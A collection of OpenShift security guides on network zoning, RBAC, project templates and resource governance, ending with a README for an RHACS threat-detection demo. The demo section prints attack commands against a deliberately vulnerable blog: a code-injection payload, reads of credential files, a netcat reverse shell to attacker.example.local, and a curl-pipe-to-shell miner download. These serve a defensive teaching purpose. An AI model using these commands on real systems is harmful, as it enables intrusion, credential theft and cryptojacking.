docs.title: Network Segmentation and Zone Isolation
docs.text: Network segmentation is a critical security architectural pattern that involves dividing a network into smaller, distinct sub-networks or "zones". This practice effectively isolates systems based on their function, sensitivity, and risk profile.

docs.title: Why Zone Isolation Matters
docs.text:
In a shared infrastructure, an attacker who compromises a single edge service often gains unrestricted visibility and access to internal systems. Segregation mitigates this risk by:

  • Mitigating Shared Kernel Risks: Containers on the same node share the host Linux kernel. If a privileged application escapes to the host (container breakout), it could compromise all other applications running on that same node. Segregating risky workloads to dedicated nodes isolates this threat.
  • Limiting the Blast Radius: Containing a breach to a specific zone prevents lateral movement to critical internal databases or management planes.
  • Defense in Depth: Adding physical or logical separation acts as an additional layer of security beyond authentication and authorization.
  • Simplifying Compliance: Isolating data subject to regulations (like PCI-DSS or HIPAA) reduces the scope of audits.
  • Traffic Control: Enforcing strict rules on what traffic can flow between zones (e.g., DMZ to Internal).

This guide demonstrates how to implement physical and logical isolation in OpenShift using Node Selectors and Namespaces.

docs.title: 0. Setup: Create Namespace & Label Node
docs.text:
First, let's set up the environment by creating the namespace and defining the node label.

1. Create the Namespace:

oc create ns dmz
oc label ns dmz env=restricted

2. Force Pods to the DMZ Zone: Patch the namespace configuration. This ensures that every pod deployed in dmz automatically gets the nodeSelector: dmz=true applied to it, even if the deployment yaml doesn't specify it.

oc patch ns dmz -p '{"metadata":{"annotations":{"openshift.io/node-selector":"dmz=true"}}}'

3. Designate a DMZ Node: Select a worker node to serve as the physical isolation zone.

# Select a node to label
oc get nodes

# Apply the label (replace <node_name>)
oc label node compute-0 dmz=true

docs.title: 1. The Demo: Deploy and Verify
docs.text:
Since we have already labeled our node dmz=true and patched the dmz namespace, any pod we create here will be forced onto that specific hardware.

Deploy the pod:

oc run dmz-app --image=registry.access.redhat.com/ubi8/httpd-24 -n dmz

Check where it is running:

oc get pod dmz-app -n dmz -o wide

In the output, look at the NODE column. It will match the specific node you labeled. If you try to deploy this same pod in a different namespace (e.g., default), it would land on an internal node instead.

docs.title: Proof of Enforcement: Shifting the DMZ Boundary
docs.text:
To prove that the workload follows the label and not just a specific machine, let's move the dmz=true label to a different node.

  1. Remove the label from the current node: 

    # Ensure you replace <current_node> with the one from the previous step (e.g., compute-0)
oc label node compute-0 dmz-

  2. Apply the label to a new node: 

    # Pick a different worker node (e.g., compute-1)
oc label node compute-1 dmz=true

  3. Redeploy the application: Since the Node Selector is enforced at scheduling time, we delete the old pod and recreate it to see the scheduler force it onto the new DMZ node.

    oc delete pod dmz-app -n dmz
oc run dmz-app --image=registry.access.redhat.com/ubi8/httpd-24 -n dmz

  4. Verify the migration: 

    oc get pod dmz-app -n dmz -o wide
    The pod has now "jumped" to the new "safe" hardware holding the dmz=true label.

docs.title: 2. Concept: Nodes and Node Groups
docs.text:
In OpenShift, Nodes are the physical or virtual machines where your code actually runs. By default, OpenShift treats all worker nodes as a single "pool" of resources.

However, for security classifications, we use Node Groups (logical sets of nodes) to create isolation boundaries:

  • Default Behavior (Shared): Without configuration, a "high-risk" web app and a "sensitive" internal database could run on the same CPU, sharing the same RAM and Linux kernel.

  • Dedicated Groups: By using labels (like dmz=true), we slice the cluster into specialized zones.

  • Infrastructure Nodes: A best practice involves dedicating specific nodes solely for platform components, most notably the Ingress Controllers (Router). Since the Ingress Controller is the front door handling all incoming HTTP/HTTPS traffic and TLS termination, isolating it ensures that high-load application logic cannot starve the routing layer of resources. It also creates a security boundary where the "traffic handling" layer is physically separate from the "business logic" layer.

graph TD
    subgraph Internet["🌐 PUBLIC INTERNET"]
        ExternalUser((Public User))
    end

    subgraph Cluster["☸️ OPENSHIFT CLUSTER BOUNDARY"]

        subgraph DMZ_Zone["🔴 DMZ ZONE (Untrusted)"]
            direction TB
            Ext_Ingress[/"<b>Dedicated DMZ Router</b><br/>(Ingress Controller Pods)<br/>NodeRole: infra-dmz"/]
            DMZ_Worker["<b>DMZ Compute Nodes</b><br/>Label: dmz=true<br/>Apps: ubi-httpd"]
        end

        subgraph Management_Plane["⚙️ CONTROL PLANE (Management)"]
            MasterAPI["Master API Server"]
        end

        subgraph Internal_Zone["🔵 INTERNAL ZONE (Trusted)"]
            direction TB
            Int_Ingress[/"<b>Default Internal Router</b><br/>(Ingress Controller Pods)<br/>NodeRole: infra-internal"/]
            Int_Worker["<b>Internal Compute Nodes</b><br/>Label: dmz=false<br/>Apps: Internal APIs / DBs"]
        end
    end

    %% Traffic Flow
    ExternalUser -->|LB / Port 443| Ext_Ingress
    Ext_Ingress -->|VLAN / SDN| DMZ_Worker

    %% Communication Barriers
    DMZ_Worker -.-x|Forbidden| Internal_Zone
    DMZ_Worker -.->|NetworkPolicy: Restricted| MasterAPI

    %% Logic
    classDef dmzNode fill:#fff1f0,stroke:#cf1322,stroke-width:2px;
    classDef intNode fill:#f0f5ff,stroke:#1d39c4,stroke-width:2px;
    class DMZ_Worker,Ext_Ingress dmzNode;
    class Int_Worker,Int_Ingress intNode;

docs.title: Why we do this (Classification Logic):
docs.text:
1. Blast Radius: If an internet-facing app is compromised via a zero-day exploit, the attacker is "trapped" on the DMZ nodes. They cannot easily use kernel exploits to jump to pods on internal nodes because those pods aren't physically there.

  2. Kernel Isolation: While Namespaces and SCCs provide logical isolation, the Kernel is a shared component. Dedicated nodes ensure that sensitive data never enters the memory space of a machine that is processing untrusted internet traffic.

docs.title: A Note on Taints and Tolerations
docs.text:
Another common Kubernetes isolation mechanism involves Taints and Tolerations:

  • Taints are applied to a Node to "repel" pods. They act like a "Do Not Enter" sign.
  • Tolerations are applied to a Pod to keycard through that sign.

We are NOT using Taints in this specific demo. Instead, we rely on Node Selectors (Affinity). While Taints are excellent for ensuring other workloads don't accidentally land on your node (repulsion), Node Selectors are the primary mechanism to force your specific workload onto a target node (attraction). For this guide, directing our DMZ traffic to the DMZ node via NodeSelectors is the primary control.

docs.title: 3. Summary of the Security Stack
docs.text:
When you combine these features, you create a "Hardened" environment:

Feature Level Purpose Namespaces Logical Keeps teams from seeing each other's configuration. SCC (restricted-v2) Process Strips the container of "Root" powers and dangerous system calls. Node Selectors Physical Ensures "Exposed" apps never share a kernel with "Internal" apps.

By using the Namespace Node Selector method we set up, you have implemented a "Guardrail." The classification is enforced at the platform level—even if a developer makes a mistake in their deployment code, the platform will force the application to stay in its designated zone.

docs.title: Granular Governance: Custom RBAC Roles
docs.text: In this demo, we move beyond generic permissions. We will create a custom role specifically for a "Security Auditor" who needs to inspect network policies and resource quotas but should not be allowed to see logs or application data.

docs.title: 1. Why Custom Roles?
docs.text: Default roles are "bundled" permissions. For example, the view role allows a user to see almost everything in a namespace. A Custom Role allows you to follow the Principle of Least Privilege to the letter by selecting only the specific API "Verbs" and "Resources" required for a task.

docs.title: Step 0: Setup Namespaces
docs.text:
# Create the namespaces for the Auditor (payments) and Monitoring (management) scenarios
oc create ns payments
oc create ns management

docs.title: 2. Defining the Custom Role
docs.text: Instead of a single command, we define a Custom Role using a YAML definition (or oc create clusterrole).

docs.title: Step 1: Create the Role Definition
docs.text:
We want a role that can only look at security-related configurations.

# Create a local Role for a specific namespace
oc create role security-inspector \
  --verb=get,list,watch \
  --resource=networkpolicies,resourcequotas,limitranges \
  -n payments

docs.title: Step 2: View the Structure
docs.text:
Inspect the role to see how OpenShift maps these to API Groups:

oc get role security-inspector -n payments -o yaml

Coaching Note: Notice the apiGroups field. This tells OpenShift exactly which API category (like networking.k8s.io) the user is allowed to access.

docs.title: 3. Identity & Binding
docs.text: Just like with default roles, we must "glue" this custom role to a subject.

docs.title: Step 1: Create the Auditor Persona
docs.text:
oc create user regional-auditor
oc adm groups new audit-team
oc adm groups add-users audit-team regional-auditor

docs.title: Step 2: Bind the Custom Role
docs.text:
# Bind the custom 'security-inspector' role to the audit group
oc adm policy add-role-to-group security-inspector audit-team -n payments

docs.title: 4. Verification: The "Surgical" Check
docs.text: Because this is a custom role, we need to verify that the permissions are strictly limited to what we defined.

docs.title: Scenario: Testing Granularity
docs.text:
# 1. Can I see the Network Policies? 
# Result: YES (Explicitly allowed)
oc auth can-i get networkpolicies -n payments --as=regional-auditor

# 2. Can I see the Pods? 
# Result: NO (The 'view' role allows this, but our custom role DOES NOT)
oc auth can-i get pods -n payments --as=regional-auditor

# 3. Can I see the Resource Quotas? 
# Result: YES (Explicitly allowed)
oc auth can-i get resourcequotas -n payments --as=regional-auditor

docs.title: 5. Custom ServiceAccount Roles
docs.text:
Custom roles are most powerful when applied to ServiceAccounts. For example, a monitoring microservice (like Prometheus) only needs to "collect" metrics, not manage the cluster.

# 1. Create a SA for a monitoring tool
oc create sa metric-collector -n management

# 2. Create a Custom Role for metrics only
oc create clusterrole metric-reader \
  --verb=get,list \
  --resource=pods,nodes/metrics

# 3. Bind it
oc adm policy add-cluster-role-to-user metric-reader \
  system:serviceaccount:management:metric-collector

docs.title: 6. Pro-Tip: ClusterRole vs. Role
docs.text:
• Role: Applied to a single namespace. Use this for application-specific security (like our Auditor in payments).
  • ClusterRole: Applied cluster-wide. Use this for infrastructure tools or users who need to see resources across all namespaces (like a global Admin or a Monitoring SA).

docs.title: Multi-tenancy on OpenShift: Projects vs. Namespaces
docs.text:
In an enterprise environment, a single cluster often hosts hundreds of applications across dozens of departments. Multi-tenancy is the strategy of allowing these "tenants" to share the same infrastructure safely. In OpenShift, the Project is the primary mechanism for enforcing this isolation.

However, true multi-tenancy requires looking beyond just the software layer. When hosting diverse applications, we must consider Data Classification. Running a highly sensitive "Restricted" application on the same worker node (and the same Kernel) as a "Public" application introduces a risk of "container breakout" attacks. To mitigate this, enterprise designs often use Node Selectors and Taints/Tolerations to create dedicated pools of hardware based on the application's sensitivity, ensuring that different classifications never share the same physical memory or CPU cycles.

docs.title: 1. Project vs. Namespace: What’s the difference?
docs.text:
If you are coming from standard Kubernetes, you are familiar with Namespaces. In OpenShift, a Project is essentially a "Namespace on steroids." It is a wrapper that adds enterprise-grade governance to the basic logical partition.

Feature Kubernetes Namespace OpenShift Project Core Object A simple logical partition for resources. A Kubernetes Namespace plus administrative metadata. RBAC Requires manual setup of RoleBindings. Automatically assigns the requester as the admin of that project. Security Minimal default isolation; relies on manual config. Enforces Security Context Constraints (SCCs) and isolation immediately. Governance No built-in self-service workflow. Includes a formal ProjectRequest provisioning workflow. Automation Standard, empty creation. Can be pre-populated via Project Templates (Quotas, Policies).

docs.title: 2. Multi-tenant Isolation: The "Boundary of Trust"
docs.text: Multi-tenancy requires more than just a separate "folder" for your resources; it requires a hardened boundary that prevents cross-tenant interference.

docs.title: Administrative Isolation & Separation of Duties
docs.text:
OpenShift uses the Project boundary to scope RBAC and enforce a strict Separation of Duties (SoD). This ensures that responsibilities are divided among different individuals to prevent fraud and error:

  • Project Admin vs. Cluster Admin: A Project Admin can manage their own team's deployments, services, and secrets but has no permission to modify cluster-wide configurations, storage classes, or nodes.
  • Developer vs. Operator: By using specific Roles (e.g., edit vs. view), you can ensure that developers can write code but cannot modify the underlying Project quotas or network policies.
  • Visibility: A user with admin rights in the frontend project has zero visibility into the payments project. Even accidental actions are physically constrained to the user's specific project.

docs.title: Network Isolation (The "Deny-All" Standard)
docs.text:
A critical part of "Proper RBAC" is ensuring that network traffic is as restricted as user permissions. It is vital to understand that by default, OpenShift (like standard Kubernetes) allows all traffic between pods across different projects. To achieve a Zero Trust model, we must use the Project Template to enforce guardrails:

  • Default Deny Ingress: By including this in a template, you ensure that every new project starts by blocking all incoming traffic from sources outside the project. Communication is only possible if a developer explicitly defines a "hole" for a specific service.
  • Default Deny Egress: This ensures pods cannot make outgoing calls to other projects or the external internet unless specifically authorized.
  • Why this matters: If a hacker gains access to a pod in the frontend project, they naturally want to move laterally. Without these guardrails, the network is wide open. With them, the hacker is "trapped" in the frontend project, unable to "hop" across the network to attack the payments database.

docs.title: 3. Resource Governance: Quotas and Limits
docs.text: In a shared cluster, "Resource Exhaustion" is a major threat. A single leaky application could consume all the cluster's memory, causing a denial of service for every other team. OpenShift manages this via the Project.

docs.title: Resource Quotas (The Project Budget)
docs.text:
A ResourceQuota provides a hard ceiling on the total resource consumption for the entire Project.

  • CPU/Memory: Limits the aggregate sum of all container requests/limits.
  • Object Counts: Limits the number of ConfigMaps, Secrets, or Services a team can create.

docs.title: Limit Ranges (The Container Rules)
docs.text:
While Quotas govern the whole project, LimitRanges govern individual pods. They ensure that every container stays within a "sane" size range.

  • Defaults: If a developer forgets to define memory limits, OpenShift automatically injects the default values defined in the LimitRange.
  • Enforcement: Prevents a developer from deploying a single pod that is so large it consumes the entire Project's quota.

docs.title: Demo: Hardening the OpenShift Project Factory
docs.text: In this demo, we will automate the creation of a Custom Project Template. This ensures that every time a developer requests a new project, it is born with a Resource Quota, LimitRange, Network Policy, and Security Labels automatically injected.

docs.title: 1. Environment Setup (Cluster Admin)
docs.text:
To modify global governance, you must be logged in as a user with cluster-admin privileges.

# Verify your administrative access
oc auth can-i '*' '*' --all-namespaces

docs.title: 2. Generate the Security Components
docs.text: We will generate our "ingredients" in JSON format so we can process them with jq.

docs.title: Step A: The Base Blueprint
docs.text:
Capture the default internal OpenShift project structure.

oc adm create-bootstrap-project-template -o json > template.json

docs.title: Step B: The Resource Quota (The Total Budget)
docs.text:
Create a quota to prevent "noisy neighbors" from consuming all cluster resources.

oc create quota project-quota --hard=cpu=4,memory=8Gi -o json --dry-run=client > quota.json

docs.title: Step C: The LimitRange (The Container Rules)
docs.text:
This ensures every container has a default size and stays within sane boundaries.

cat <<EOF > limits.json
{
  "kind": "LimitRange",
  "apiVersion": "v1",
  "metadata": {
    "name": "project-limits"
  },
  "spec": {
    "limits": [
      {
        "type": "Container",
        "default": {
          "cpu": "500m",
          "memory": "1Gi"
        },
        "defaultRequest": {
          "cpu": "200m",
          "memory": "512Mi"
        },
        "max": {
          "cpu": "2",
          "memory": "2Gi"
        }
      }
    ]
  }
}
EOF

docs.title: Step D: The Deny-All Ingress (The Firewall)
docs.text:
Note that OpenShift is "Allow-All" by default; this policy overrides that behavior.

cat <<EOF > deny-ingress.json
{
  "kind": "NetworkPolicy",
  "apiVersion": "networking.k8s.io/v1",
  "metadata": {
    "name": "default-deny-ingress"
  },
  "spec": {
    "podSelector": {},
    "policyTypes": ["Ingress"]
  }
}
EOF

docs.title: 3. The Automated Assembly (The jq Magic)
docs.text:
We will use jq to "glue" our custom security objects into the master template's objects array and inject a custom security label into the Namespace metadata.

# Merge Budget, Limits, and Firewall into the Blueprint
jq --slurpfile q quota.json \
   --slurpfile l limits.json \
   --slurpfile n deny-ingress.json \
   '.objects += ($q + $l + $n)' \
   template.json > final-custom-template.json

docs.title: 4. Activate Global Governance
docs.text:
Now we upload the blueprint and patch the cluster to enforce it.

# 1. Upload the template to the global configuration namespace
oc create -f final-custom-template.json -n openshift-config

# 2. Patch the cluster to use this blueprint for ALL new projects
oc patch project.config.openshift.io/cluster --type=merge \
  -p '{"spec":{"projectRequestTemplate":{"name":"project-template"}}}'

docs.title: 5. The Reveal: Verification
docs.text:
We now simulate a developer creating a project to observe the multi-layered governance in action.

# 1. Create a new team project
oc new-project secure-app-demo

# 2. Verify Metadata: Check for our custom security label
oc get namespace secure-app-demo --show-labels

# 3. Verify Ingress: This proves Zero-Trust is active Day 0
oc get networkpolicy -n secure-app-demo

# 4. Verify Admission Control: Check Quota and LimitRange
oc get quota,limitrange -n secure-app-demo

docs.title: 6. Key Takeaways for the Audience
docs.text:
• Automation over Manual Effort: Security and governance were injected at birth without manual intervention.
  • Granular Control: We controlled the total budget (Quota), the individual container sizes (LimitRange), and the network entry points (NetworkPolicy).
  • Environment Consistency: Every project on the cluster now adheres to the same baseline security posture, reducing the risk of human error during setup..

docs.title: 7. Cleanup (Resetting the Cluster)
docs.text:
# Remove the template pointer from the global configuration
oc patch project.config.openshift.io/cluster --type=json \
  -p '[{"op": "remove", "path": "/spec/projectRequestTemplate"}]'

# Delete the template from the config namespace
oc delete template project-template -n openshift-config

docs.title: Mastering RBAC: Governance for Microservices
docs.text: Role-Based Access Control (RBAC) isn't just about permissions; it’s about intent. In this demo, we implement a Least Privilege model for a 3-tier application: frontend, backend, and payments.

docs.title: 1. The RBAC Trinity
docs.text:
Before running commands, it is essential to understand the three components that make RBAC work. Think of it as a sentence: "This Subject can perform these Verbs on these Resources."

  • Subject: The "Who" (User, Group, or ServiceAccount).
  • Role / ClusterRole: The "What" (A list of rules: get, list, watch, create, etc.).
  • RoleBinding: The "Glue" (Connects a Subject to a Role within a specific Namespace).

docs.title: 2. Identity Management: The Source of Truth
Why Groups Matter
docs.text: In production, users are managed in external systems like Active Directory or Okta. We use Groups because they provide a layer of abstraction. If a developer leaves the company, you remove them from the AD Group, and their OpenShift access vanishes automatically—no changes to the cluster required.

docs.title: Step 1: Simulate the Identity Provider
docs.text:
# Create simulated users
oc create user frontend-dev
oc create user backend-dev
oc create user payment-admin

# Create functional groups
oc adm groups new frontend-team
oc adm groups new backend-team
oc adm groups new payment-team

# Map users to groups
oc adm groups add-users frontend-team frontend-dev
oc adm groups add-users backend-team backend-dev
oc adm groups add-users payment-team payment-admin

docs.title: Step 2: Create the Project Structure
docs.text:
Create the three namespaces that represent our application tiers:

oc new-project frontend
oc new-project backend
oc new-project payments

docs.title: 3. The Permission Strategy Matrix
docs.text:
A "proper" RBAC implementation starts with a requirements matrix. We use OpenShift’s Default Local Roles:

  • Admin: Full power within the project (can grant permissions to others).
  • Edit: Can create/modify/delete most resources (Pods, Services) but cannot manage permissions.
  • View: Read-only access. Importantly, cannot see Secrets.
Team Namespace: frontend Namespace: backend Namespace: payments Frontend Team Edit (Owner) View (Logs/API) ⛔ No Access Backend Team View (Integration) Edit (Owner) View (Connectivity) Payment Team ⛔ No Access ⛔ No Access Admin (Security Owner)

docs.title: 4. Applying the Glue (Role Bindings)
docs.text: When we run add-role-to-group, OpenShift creates a RoleBinding object inside that namespace.

docs.title: Frontend & Backend Access
docs.text:
# Frontend owns 'frontend', views 'backend'
oc adm policy add-role-to-group edit frontend-team -n frontend
oc adm policy add-role-to-group view frontend-team -n backend

# Backend owns 'backend', views 'frontend' and 'payments'
oc adm policy add-role-to-group edit backend-team -n backend
oc adm policy add-role-to-group view backend-team -n frontend
oc adm policy add-role-to-group view backend-team -n payments

docs.title: High-Security Payment Access
docs.text:
# Payment Admin gets 'admin' role for full lifecycle management
oc adm policy add-role-to-group admin payment-team -n payments

docs.title: 5. Verification: The "Can-I" Audit
docs.text: The oc auth can-i command is the most powerful tool for a security admin. It allows you to impersonate a user to verify your logic.

docs.title: Scenario: The "View" Role Security Check
docs.text:
A common mistake is thinking view can see everything. Let's test the Backend Developer trying to look at Payment Secrets:

# Can I see the pods in payments?
# Result: YES (View allows this)
oc auth can-i get pods -n payments --as=backend-dev

# Can I see the database passwords (Secrets) in payments?
# Result: NO (View role explicitly excludes Secrets for security)
oc auth can-i get secrets -n payments --as=backend-dev

Insight: This is why we use view for cross-team debugging. It allows developers to see logs and statuses without exposing sensitive credentials like API keys or database passwords.

docs.title: 6. Pro-Tip: Inspecting the Binding
docs.text:
To see the "proper" technical object created by these commands, you can inspect the RoleBinding directly:

oc get rolebinding -n payments

This will show you exactly which group is tied to which role, providing an audit trail for your security team.

docs.title: 7. Machine Identities: ServiceAccounts
docs.text: While Groups are for humans, ServiceAccounts are for your applications. If your backend microservice needs to query the OpenShift API to find the IP of the payment service, it needs its own identity.

docs.title: Step 1: Create the ServiceAccount
docs.text:
# Create a dedicated identity for the application
oc create sa backend-app-sa -n backend

docs.title: Step 2: Grant API Access
docs.text:
Applications should also follow the Least Privilege model. We grant the backend application service account the view role in the payments namespace so it can perform service discovery.

# Grant 'view' to the ServiceAccount specifically
oc adm policy add-role-to-user view \
    system:serviceaccount:backend:backend-app-sa \
    -n payments

docs.title: Step 3: Verification (The Machine Check)
docs.text:
# Can the backend microservice list pods in payments?
# Result: YES
oc auth can-i get pods -n payments \
    --as=system:serviceaccount:backend:backend-app-sa

# Can the backend microservice delete pods in payments?
# Result: NO
oc auth can-i delete pods -n payments \
    --as=system:serviceaccount:backend:backend-app-sa

docs.title: RHACS Threat Detection & Response — zero CVEs, still breached, caught in seconds
docs.text:
"0 CVEs is where security starts, not where it ends."

📸 Step-by-step walkthrough with screenshots of a real run → 🎤 The 40-minute talk: run of show → · word for word →

A self-contained demo for Red Hat Advanced Cluster Security 5.0 on OpenShift Local (CRC). A blog with zero CVEs and the lowest risk score in the cluster gets breached through a bug in its own code. Every attacker move — recon, credential hunting, lateral movement, reverse shell, crypto miner — lights up in RHACS within seconds. Then RHACS kills the pod and a NetworkPolicy contains the blast radius. No AI, no LLMs: just a classic web bug and the runtime controls that catch it.

docs.title: Contents
docs.text:
• The story in one minute
  • Quick start with make
  • Live mode — make live
  • Setup (once)
  • Before you go on stage
  • Delivering the demo, act by act
  • Reset between runs
  • The attacker lives outside the cluster
  • roxctl and the rox-* helpers
  • RHACS 5.0 features used
  • What's in the box
  • Questions you will get
  • Troubleshooting

docs.title: The story in one minute
docs.text:
Act Title What happens What RHACS shows 1 Unhackable Marketing calls the blog unhackable. RHACS agrees: 0 CVEs, hardened, no violations. Vulnerability management: 0 CVEs. Risk: lowest. Violations: none. 2 Day zero Check links lets writers attach a Go rule, run by an embedded interpreter (yaegi) that was handed exec.Command. A rule is code — so it runs host commands. Code injection (CWE-94). Unauthorized process (id, uname, cat) — the baseline is a single binary. 3 Loot No SA token, no secrets in env… but AWS keys in ~/.aws/credentials and secrets in the app's .env. They're honeytokens. Then the blog reads card data from payments-api. Honeytoken touched. Unexpected network flow to payments-api (its baseline is empty and locked). Network graph: anomalous blog → payments, blog → kube API. 4 Persistence & profit Reverse shell to attacker.example.local:4444. Crypto miner downloaded into /tmp, made executable, started. Reverse shell tool executed, Crypto miner, Container drift: file dropped or made executable, flows to the external entity attacker.example.local. 5 Respond Kill first: enforcement on, the attacker's next command kills the pod — blast radius cut, time bought. Then a NetworkPolicy closes the door. Violation with Enforced: kill pod. New clean pod. Egress blocked. 6 Fix forward Ship v2: rule engine removed, URL parsed, native HTTP client. Still 0 CVEs. Exploit is dead. Clean v2 image, no new violations.

The one-line takeaway: vulnerability scanning tells you what could go wrong in the code you imported; runtime detection tells you what is going wrong in the code you wrote — and stops it.

docs.title: Quick start with make
docs.text:
make install     # first time only: CRC + RHACS + demo (~45-60 min)
make up          # every session: starts EVERYTHING (CRC, RHACS, demo, attacker), installs what's
                 # missing, resets, then verifies end to end — when it says "armed", you can show
make verify      # re-run just the end-to-end checks
make status      # where are we? CRC, RHACS, Scanner V4 DB, blog, enforcement, violations, attacker
make password    # RHACS console URL, user and password

make live        # the show: tmux with attacker curl | C2 nc | RHACS alerts | pods
make act1 … act6 # or the scripted acts (run `make c2` in a second terminal before act4)
make reset       # between runs
make down        # stop everything (live views, attacker, CRC) — deletes nothing, frees the RAM
make recreate    # cluster broken beyond a restart? delete it and rebuild everything (asks first)

make on its own lists every target. The sections below explain what each step does.

docs.title: Live mode — make live (recommended on stage)
docs.text:
One tmux window, five panes. You type one short command per attacker move; everything else reacts on its own. The pane shows the request and a clean, readable result — no shell noise — so a CISO or architect in the room can follow every step and watch RHACS catch it. Each pane has its own subtle tint so a busy screen stays readable — the two warm panes on the left are the attacker (your laptop); the three cool panes on the right are the live cluster.

┌──────────────────────────────────┬──────────────────────────────────┐
│ 1  ATTACKER — you type pwn '…'   │ 3  RHACS — live threat timeline  │
│    (cheat sheet printed here)    │    severity · MITRE · what ran   │
│                                  ├──────────────────────────────────┤
├──────────────────────────────────┤ 4  BLOG — app logs (oc logs -l)  │
│ 2  C2 — nc on attacker.example   │    every attack = a "link check" │
│    .local:4444 (shell lands here)├──────────────────────────────────┤
│                                  │ 5  PODS — the kill + restart     │
└──────────────────────────────────┴──────────────────────────────────┘

The BLOG pane is the "fix what?" answer: the app's own logs show only innocent link check lines — the attack is invisible at the application layer, which is exactly why runtime detection earns its place. Act 6 fixes that one endpoint.

Each move is one line. link uses the feature normally; pwn runs a command through the injection. Both make the exact same HTTP POST a browser would — they just print the request and result cleanly:

pwn 'id'     # = curl -sk $BLOG/api/links/check --data-urlencode "url=';id #", de-noised
Step Type in pane 1 Watch the feature link https://www.redhat.com/en alive: … — normal use, no alert 1 · the bug pwn 'id' pane 3: Unauthorized process 2 · credentials pwn 'cat ~/.aws/credentials', pwn 'cat /opt/blog/.env' pane 3: Honeytoken touched 3 · lateral pwn 'curl -s http://payments-api.payments.svc:8080/api/v1/cards' pane 3: Unexpected network flow to payments-api 4 · reverse shell pwn 'nc attacker.example.local 4444 -e /bin/sh >/dev/null 2>&1 &' pane 2: connect to … then a live shell — type id, ps there 5 · miner pwn 'curl -s http://attacker.example.local:8080/stage.sh \| sh' pane 3: Crypto miner, Container drift respond 1 make enforce, then repeat step 1 pane 4: pod killed and replaced · pane 3: POD KILLED · pane 2: shell dies, listener restarts respond 2 make contain, then repeat step 4 nothing reaches pane 2 — egress blocked fix make fix, then repeat step 1 not a valid http(s) URL again make reset

The full list is printed in pane 1 when the session opens (scripts/live.sh --cheatsheet). The reverse shell is raw — no prompt — so pane 2 stays quiet until connect to … from … appears; then type id blindly. Click a pane to type in it; Ctrl-b d detaches, tmux kill-session -t tdr closes it.

After changing app/blog, run make images to rebuild, push and rescan (the cluster must be up).

docs.title: Setup (once)
docs.text:
Requirements: Fedora/RHEL laptop with KVM, ≥ 30 GB RAM, 8+ cores, 120 GB free disk, oc, roxctl, podman, jq, a Red Hat pull secret at ~/pull-secret.txt (download) and the CRC tarball in ~/Downloads.

cd use_cases/threat-detection-response

scripts/00-crc-up.sh        # ~25 min first time: libvirt, crc setup, crc start (8 vCPU / 20 GiB / 100 GiB)
scripts/01-rhacs-install.sh # ~15 min: operator → Central → CRS → SecuredCluster "production" → API token
scripts/02-demo-setup.sh    # ~5 min: build+push images, deploy, policies, learn + LOCK baselines, start the attacker

All three are idempotent — re-run any of them safely. They ask for root once (fingerprint works).

Sizing & networking. CRC defaults (4 vCPU / 10.75 GiB / 31 GiB) can't carry RHACS. The script sets 8 vCPU, 20 GiB RAM, 100 GiB disk (sparse — only used space costs), and turns cluster monitoring off (saves ~4 GiB). Networking is system mode (libvirt bridge 192.168.130.0/24, DNS for *.apps-crc.testing via the NetworkManager dispatcher that crc setup installs). Host network access stays off: the attacker infrastructure lives inside the cluster, so the VM never needs to reach the laptop and the laptop firewall can keep dropping all inbound traffic.

Script What it does 00-crc-up.sh Installs crc from the tarball, installs libvirt/KVM, joins the libvirt group (no re-login), configures CRC sized for RHACS, crc setup, crc start, logs in, exposes the image registry. Tunables: CRC_CPUS, CRC_MEMORY, CRC_DISK, PULL_SECRET. 01-rhacs-install.sh RHACS 5.0 operator (stable channel), Central tuned for one node (Scanner V4 only), a Cluster Registration Secret generated with roxctl central crs generate, SecuredCluster production with eBPF collector and file activity monitoring, and an API token in .state/rhacs.env (mode 600, git-ignored). The admin password is never printed: --password copies it to the clipboard. 02-demo-setup.sh Builds blog v1/v2 (pushed to the CRC registry) and the attacker kit (local only), connects RHACS to the registry, deploys the blog and payments-api fresh, loads the policies as code, enables Unauthorized Network Flow, generates normal traffic, pins and locks the process and network baselines, tries one image scan (never waits for Scanner V4 — its DB finishes loading by itself), then starts the attacker (attacker.sh up). attacker.sh The attacker's machine is this laptop — see The attacker lives outside the cluster. up, c2, logs, status, down.

docs.title: Before you go on stage
docs.text:
scripts/demo.sh reset      # v1, enforcement off, NetworkPolicies removed, violations resolved
scripts/demo.sh status     # sanity check: image v1, enforcement [], no netpols, no violations

Lay out your screen:

Window What Terminal A (big font) scripts/demo.sh act1 … act6 Terminal B scripts/attacker.sh c2 — the attacker's reverse-shell listener on this laptop (start it during Act 4) Browser tab 1 The blog: https://blog-unhackable.apps-crc.testing (open /write) Browser tab 2 RHACS → Violations, filtered to namespace unhackable Browser tab 3 RHACS → Network Graph, namespaces unhackable, payments, attacker Browser tab 4 RHACS → Vulnerability Management → image unhackable/blog:v1

RHACS login: rox-ui prints URL, user and password (rox-password prints just the password and copies it). demo.sh act1 prints all the links.

Each act prints 💬 what to say and 👉 what to show. Acts pause at [enter] where you switch to the browser (NO_PAUSE=1 disables pauses). Total runtime: 20–25 minutes.

docs.title: Delivering the demo, act by act
Act 1 — "Unhackable" (3 min)
docs.text:
scripts/demo.sh act1

Open with the claim. Show the blog homepage: "The blog that can't be hacked." Then prove it with RHACS:

  • Vulnerability Management → Images → unhackable/blog:v1: 0 CVEs. Point out why: a static Go binary with no third-party modules, latest Alpine with everything upgraded, apk removed. No KEV matches either — nothing on CISA's exploited list because there's nothing on any list.
  • Risk → blog: lowest in the cluster. Non-root, read-only root filesystem, all capabilities dropped, no service account token, limits set.
  • Violations: none.

💬 "Every scanner is green. Every admission gate passes. If this were your app, you'd ship it. So — is it secure?"

Let the question hang. That's the hook for the rest of the talk.

docs.title: Act 2 — "Day zero" (4 min)
docs.text:
scripts/demo.sh act2
  1. In the browser open /write, press Check links — it works, links are green. This feature is real and useful.
  2. Explain the feature: Check links lets power users attach a short Go rule to validate a link. The app evaluates it with an embedded Go interpreter (yaegi) — and handed that sandbox exec.Command. Show app/blog/linkcheck_v1.go. yaegi scans clean (0 CVEs) — the bug is giving it a dangerous capability and untrusted input.
  3. Press enter: the "rule" is Go that runs id. It comes back: remote code execution (CWE-94).

💬 "That's not a CVE. There's no package to upgrade, no advisory, no scanner signature. It's our code. This is the class of bug that zero-CVE images don't protect you from."

Switch to Violations: TDR – Unauthorized process in the Unhackable Blog is already there — id, uname, cat, head. Open it and show the process details: exec path, arguments, parent, UID, container, time. Explain process baselines: RHACS learned that this container runs exactly a single binary (blog) — the app validates links natively and runs rules in-process, so it spawns no child process at all — and we locked that baseline. Any process is an alert.

